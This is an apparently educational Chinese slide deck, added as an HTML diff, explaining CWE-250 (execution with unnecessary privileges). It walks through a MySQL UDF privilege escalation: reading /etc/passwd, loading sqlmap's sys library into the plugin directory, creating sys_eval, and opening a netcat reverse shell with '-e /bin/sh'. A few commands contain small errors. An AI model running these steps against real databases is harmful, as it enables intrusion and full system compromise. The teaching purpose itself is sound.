@@ -1,0 +1,193 @@
+<!--
+    Powered By nodePPT
+    version: 0.6.1
+    site: https://github.com/ksky521/nodePPT
+-->
+<!doctype html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CWE-250 - By Brickgao</title>
+    <link rel="stylesheet" media="all" href="/css/nodeppt.css">
+    <link rel="stylesheet" media="only screen and (max-device-width: 480px)" href="/css/phone.css">
+    <link rel="stylesheet" href="/js/highlight/monokai.css">
+</head>
+<body>
+
+<slides id="container">
+    <slide class="slide"><article class="flexbox vcenter">
+<h1>CWE-250</h1>
+<h2>Execution with Unnecessary Privileges</h2>
+
+</article></slide>
+<slide class="slide"><hgroup>
+<h2>简述</h2>
+
+</hgroup><article>
+
+<p>CWE-250，即带着不必要的权限执行。</p>
+<p>软件进行操作的时候处于高权限，该权限高于软件需要的最小权限，这种情况可能导致软件的缺陷或扩大原来的缺陷。</p>
+
+</article></slide>
+<slide class="slide"><hgroup>
+<h2>一个简单例子</h2>
+
+</hgroup><article>
+
+<pre><code class="python">def makeNewUserDir(username):
+    if invalidUsername(username):
+        #avoid CWE-22 and CWE-78
+        print(&#39;Usernames cannot contain invalid characters&#39;)
+        return False
+    try:
+        raisePrivileges()
+        os.mkdir(&#39;/home/&#39; + username)
+        lowerPrivileges()
+    except OSError:
+        print(&#39;Unable to create new user directory for user:&#39; + username)
+        return False
+    return True</code></pre>
+
+</article></slide>
+<slide class="slide"><hgroup>
+<h2> </h2>
+
+</hgroup><article>
+
+<p>在这种情况中，其中<code>lowerPrivileges()</code>是降低权限，<code>raisePrivileges()</code>是提高权限。</p>
+<p>如果在<code>os.mkdir()</code>语句中出现异常中断，程序就还会保持在高权限，这时就可能进行原来低权限中无法进行的事。</p>
+
+</article></slide>
+<slide class="slide"><hgroup>
+<h2>一个实例</h2>
+
+</hgroup><article>
+
+<p>通过 Mysql 的 UDF 提权。</p>
+<p>UDF 是 User Defined Function 的简称，即用户定义函数。</p>
+<p>我们可以通过自定义的函数来获得 shell，进而获得系统的权限。</p>
+
+</article></slide>
+<slide class="slide"><hgroup>
+<h2> </h2>
+
+</hgroup><article>
+
+<p>在这里我们为了简单起见，假设我们已经有了 mysql 的用户名和密码。</p>
+<p>mysql 里的函数不仅可以操作数据库，还可以操作外部的文件，例如我们可以通过 load_file() 函数来查看某个文件的内容：</p>
+<pre><code class="bash">     mysql &gt; select load_file(&#39;/etc/passwd&#39;)\G</code></pre>
+<p>这样我们就相当于在本机上执行了<code>cat /etc/passwd</code>，当然 load_file() 函数可以被禁用。</p>
+
+</article></slide>
+<slide class="slide"><hgroup>
+<h2> </h2>
+
+</hgroup><article>
+
+<p>好的，我们现在开始利用 mysql 的 UDF 来提权。</p>
+<p>先远程连接数据：</p>
+<pre><code class="bash">     root@bt:~# mysql 192.168.0.2 -u root -p123</code></pre>
+<p>获取插件库路径：</p>
+<pre><code class="bash">     mysql&gt; show variables like &quot;%plugin%&quot;;</code></pre>
+<p><img src="/img/mysql01.png" alt=""></p>
+
+</article></slide>
+<slide class="slide"><hgroup>
+<h2> </h2>
+
+</hgroup><article>
+
+<p>利用 sqlmap 的 UDF 库文件加载函数并执行命令：</p>
+<pre><code class="bash">     mysql&gt; select hex(load_file(&#39;/pentest/database/sqlmap/udf/mysql
+            /linux/64/lib_mysqludf_sys.so&#39;)) into outfile &#39;/tmp/udf.txt&#39;;
+     mysql&gt; select unhex(loadfile(&#39;/tmp/udf.txt&#39;)) into dumpfile
+            &#39;/usr/lib/mysql/plugin/mysql&#39;</code></pre>
+<p>我们可以看下这个 UDF 库支持的函数：</p>
+<p><img src="/img/mysql02.png" alt=""></p>
+
+</article></slide>
+<slide class="slide"><hgroup>
+<h2> </h2>
+
+</hgroup><article>
+
+<p>加载函数并执行：</p>
+<pre><code class="bash">     mysql&gt; create function sys_eval returns string soname &quot;mysqludf.so&quot;;</code></pre>
+<p>查看一下我们的函数：</p>
+<pre><code class="bash">     mysql&gt; select * from mysql.func;</code></pre>
+<p><img src="/img/mysql03.png" alt=""></p>
+
+</article></slide>
+<slide class="slide"><hgroup>
+<h2> </h2>
+
+</hgroup><article>
+
+<p>这是我们基本就可以用这个函数库来提权了，格式如下：</p>
+<pre><code class="bash">     mysql&gt; sys_eval(&lt;input function&gt;);</code></pre>
+<p>我们可以通过 nc 反弹来获得 shell，比如在自己的主机下执行：</p>
+<pre><code class="bash">     root@bt:~# nc -vv -l -p 12345</code></pre>
+<p>在数据库中执行：</p>
+<pre><code class="bash">     mysql&gt; sys_eval(&quot;nc &lt;ip&gt; 12345 -e /bin/sh&quot;);</code></pre>
+<p>这样就成功反弹出 shell 了。</p>
+
+</article></slide>
+    <slide class="slide thank-you-slide segue nobackground">
+        <article class="flexbox vleft auto-fadein">
+            <h2>Q &amp; A</h2>
+            <h3>&lt;Thank You!&gt;</h3>
+        </article>
+    </slide>
+    <slide class="slide logoslide dark nobackground">
+        <article class="flexbox vcenter">
+          <h2 style="color: white;">Powered By nodePPT v0.6.1</h2>
+        </article>
+      </slide>
+    <div class="slideTip" id="tip"></div>
+</slides>
+<canvas id="drawBoard" class="draw-board" width="900" height="700"></canvas>
+<div class="progress"><span id="progress"></span></div>
+<script src="/js/mixjs/lib/mix.0.3.0.min.js"></script>
+<script>
+var base = location.protocol + '//' + location.host + '/';
+MixJS.config({
+    baseURL:base + 'js/'
+});
+MixJS.use('event/broadcast', function($){
+    $.loadJS('/js/nodeppt.js',function(){
+        Slide.init({
+            containerID: 'container',
+            drawBoardID: 'drawBoard',
+            slideClass: '.slide',
+            buildClass: '.build',
+            progressID: 'progress',
+            transition: 'horizontal',
+            tipID: 'tip',
+            width: 1100,
+            dir: '/js/',
+            // control:{
+            //     type: 'socket',
+            //     args:{
+            //         isControl: location.hash.slice(1,8) === 'control',
+            //         host: base,
+            //         //摇一摇
+            //         shake: true
+            //     }
+            // }
+            //打开下面的注释就开启postMessage方式
+            //访问网址127.0.0.1:8080/ppt/demo#client
+            control:{
+                type: 'postMessage'
+            }
+        });
+    }).loadJS('/js/highlight/highlight.pack.js',function(){
+
+        hljs.tabReplace = '  ';
+        hljs.initHighlightingOnLoad();
+    });
+});
+</script>
+<script src="/js/demo.js"></script>
+<link rel="stylesheet" href="/css/demo.css">
+</body>
+</html>
